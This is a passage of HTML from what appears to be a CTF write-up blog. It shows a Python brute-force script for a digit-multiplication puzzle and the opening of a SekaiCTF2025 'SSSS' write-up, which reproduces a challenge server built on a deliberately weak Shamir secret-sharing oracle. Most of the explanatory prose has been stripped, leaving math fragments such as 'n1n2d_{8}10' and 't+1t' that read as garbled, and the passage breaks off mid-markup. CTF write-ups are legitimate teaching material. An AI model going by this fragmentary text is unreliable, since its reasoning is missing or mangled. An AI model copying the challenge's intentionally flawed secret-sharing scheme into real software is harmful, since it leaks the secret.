stretchy="false">)</mo><mo>=</mo><msub><mi>d</mi><mn>8</mn></msub><mo></mo><mn>1</mn><msup><mn>0</mn><mn>14</mn></msup><mo></mo><msub><mi>d</mi><mn>8</mn></msub><mo></mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mo></mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x*y-multwo(x,y,14)=d_{8}*10^{14}-d_{8}*10^{7}*y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">o</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo></mo><mi>y</mi><mo></mo><mi>m</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi>w</mi><mi>o</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mn>14</mn><mo stretchy="false">)</mo><mo>=</mo><msub><mi>d</mi><mn>8</mn></msub><mo></mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mo></mo><mo stretchy="false">(</mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup><mo></mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x*y-multwo(x,y,14)=d_{8}*10^{7}*(10^{7}-y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">o</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mn>1</mn><mtext></mtext><mi>n</mi><mn>2</mn><mtext></mtext><msub><mi>d</mi><mn>8</mn></msub><mtext></mtext><mn>10</mn><mtext></mtext></mrow><annotation encoding="application/x-tex">n1n2d_{8}10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">n</span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">n</span><span class="mord">2</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord">1</span><span class="mord">0</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> digits == N:</span><br><span class="line">    n1 = x*y - multwo(x, y, N*<span class="number">2</span>)</span><br><span class="line">    n2 = <span class="number">10</span>**N * (<span class="number">10</span>**N - y)</span><br><span class="line">    <span class="keyword">if</span> n1 &lt; <span class="number">10</span> * n2 <span class="keyword">and</span> n1 % n2 == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1//n2&#125;</span><span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pairs = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) <span class="keyword">if</span> x*y &gt;= <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multwo</span>(<span class="params">i, j, digits</span>):</span><br><span class="line">    s, mul = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>((digits+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">        s += (i % <span class="number">10</span>) * (j % <span class="number">10</span>) * mul</span><br><span class="line">        i, j, mul = i // <span class="number">10</span>, j // <span class="number">10</span>, mul * <span class="number">100</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">x, y, digits, N=<span class="number">7</span></span>):</span><br><span class="line">    <span class="keyword">if</span> digits == N:</span><br><span class="line">        n1 = x*y - multwo(x, y, N*<span class="number">2</span>)</span><br><span class="line">        n2 = <span class="number">10</span>**N * (<span class="number">10</span>**N - y)</span><br><span class="line">        <span class="keyword">if</span> n1 &lt; <span class="number">10</span> * n2 <span class="keyword">and</span> n1 % n2 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1//n2&#125;</span><span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    mul = <span class="number">10</span>**digits</span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> pairs:</span><br><span class="line">        x2 = a*mul + x</span><br><span class="line">        y2 = b*mul + y</span><br><span class="line">        <span class="keyword">if</span> (multwo(x2, y2, digits+<span class="number">1</span>) - x2*y2) % (<span class="number">10</span>*mul) == <span class="number">0</span>:</span><br><span class="line">            process(x2, y2, digits+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">process(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>oVo</strong></p><h1 id="sekaictf2025-ssss"><a class="markdownIt-Anchor" href="#sekaictf2025-ssss"></a> SekaiCTF2025 - SSSS</h1><blockquote><p>Shamir SendS the Secret to everyone</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SEKAI&#123;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">secret</span>):</span><br><span class="line">  t = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">  <span class="keyword">assert</span> <span class="number">20</span> &lt;= t &lt;= <span class="number">50</span>, <span class="string">&quot;Number of parties not in range&quot;</span></span><br><span class="line"></span><br><span class="line">  f = gen(t, secret)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">    x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt; x &lt; p, <span class="string">&quot;Bad input&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(poly_eval(f, x))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>()) == secret:</span><br><span class="line">    <span class="built_in">print</span>(FLAG)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;:&lt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">degree, secret</span>):</span><br><span class="line">  poly = [random.randrange(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(degree + <span class="number">1</span>)]</span><br><span class="line">  index = random.randint(<span class="number">0</span>, degree)</span><br><span class="line"></span><br><span class="line">  poly[index] = secret</span><br><span class="line">  <span class="keyword">return</span> poly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_eval</span>(<span class="params">f, x</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sum</span>(c * <span class="built_in">pow</span>(x, i, p) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(f)) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  secret = random.randrange(<span class="number">0</span>, p)</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    challenge(secret)</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>S</mi><mi>h</mi><mi>a</mi><mi>m</mi><mi>i</mi><mi>r</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">Shamir</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">h</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>t</mi><mo>+</mo><mn>1</mn><mtext></mtext><mi>t</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">t+1t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>c</mi><mn>0</mn></msub><mo>+</mo><msub><mi>c</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><mi>S</mi><msup><mi>x</mi><mrow><mi>i</mi><mi>n</mi><mi>d</mi><mi>e</mi><mi>x</mi></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>c</mi><mi>t</mi></msub><msup><mi>x</mi><mi>t</mi></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)=c_{0}+c_{1}x+...+Sx^{index}+...+c_{t}x^{t}\pmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9824379999999999em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.993556em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.843556em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>t</mi><mtext></mtext><mi>t</mi><mtext></mtext><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext></mtext><mi>c</mi><mi>h</mi><mi>a</mi><mi>l</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">tt(x_{i},f(x_{i}))challenge()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>s</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>e</mi><mi>t</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">secret</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>t</mi><mo>+</mo><mn>1</mn><mtext></mtext><mi>t</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">t+1t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord 